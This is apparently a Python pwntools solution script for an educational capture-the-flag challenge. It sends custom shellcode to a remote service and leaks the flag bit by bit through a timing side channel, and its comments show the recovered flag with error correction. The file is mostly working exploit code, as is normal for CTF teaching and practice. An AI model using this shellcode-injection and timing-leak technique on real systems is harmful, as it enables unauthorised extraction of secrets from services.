from pwn import *
from threading import Timer
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

flag_addr = 0x4040
register_addr = 0x1289
flag = ""
# r = remote('edu-ctf.zoolab.org', 10002)
time_diff = []
state = 0

def checkbit(byte_index, bit_index, r):
    global flag_addr
    global flag
    myasm = """
    mov al, BYTE PTR [r13+{0}];
    xor r11, r11;
    shr al, {1};
    and al, 0x1;
    cmp rax, r11;
    je loop_done;
    imul rax, 0x30000000;
    loop_start:
    cmp rax, r11;
    je loop_done;
    inc r11;
    imul rbx, 0x30000000;
    imul rcx, 0x20000000;
    imul r8, 0x30000000;
    imul r9, 0x30000000;
    jmp loop_start;
    loop_done:
    leave;
    ret;
    """.format(hex(flag_addr-register_addr+byte_index), hex(bit_index))
    addr = asm(myasm)
    before = time.time()
    r.sendafter('talk is cheap, show me the code\n', addr)
    r.recvall()
    diff = time.time() - before
    print(diff)
    time_diff.append(diff)
    if diff > 0.6:
        flag += '1'
    else:
        flag += '0'

def closeSocket(r):
    global flag
    global state
    if state == 0:
        flag += '1'
    else:
        flag += '0'
    r.close()
    print(flag)

def checkbit_stuck(byte_index, bit_index, r):
    global flag_addr
    global flag
    global state
    myasm = """
    mov al, BYTE PTR [r13+{0}];
    xor r11, r11;
    shr al, {1};
    and al, 0x1;
    cmp rax, r11;
    je loop_done;
    imul rax, 0x30000000;
    loop_start:
    jmp loop_start;
    loop_done:
    leave;
    ret;
    """.format(hex(flag_addr-register_addr+byte_index), hex(bit_index))
    addr = asm(myasm)
    r.sendafter('talk is cheap, show me the code\n', addr)
    r.recvall()
    print("0")


def run():
    for byte_index in range(0x30):
        for bit_index in range(7, -1, -1):
            r = remote('edu-ctf.zoolab.org', 10002)
            checkbit(byte_index, bit_index, r)
            print(flag)

def test():
    # function to check the error bits
    r = remote('edu-ctf.zoolab.org', 10002)
    checkbit_stuck(37, 4, r)

run()
mybytes = bytes(int(flag[i:i+8], 2) for i in range(0, len(flag), 8))
print(mybytes)

"""
Example of dealing with errors:

1st attempt: FLAG{piano_d113f1c3f9ed80192<8f4e8ddesfb8ec}
2nd attempt: FLAG{piano_d113f1c3f9ed8019288fte8ddecfb8ec}

s = 73 -> 0111 0111
c = 63 -> 0110 0111
37th byte, index 4 --> checkbit_stuck(37, 4, r)
result = 0

< = 3c -> 0011 1100
8 = 38 -> 0011 1000
28th byte, index 2 --> checkbit_stuck(28, 2, r)
result = 0

4 = 34 -> 0011 0100
t = 74 -> 0111 0100
31th byte, index 6 --> checkbit_stuck(31, 6, r)
result : 0

final result = FLAG{piano_d113f1c3f9ed8019288f4e8ddecfb8ec}
"""
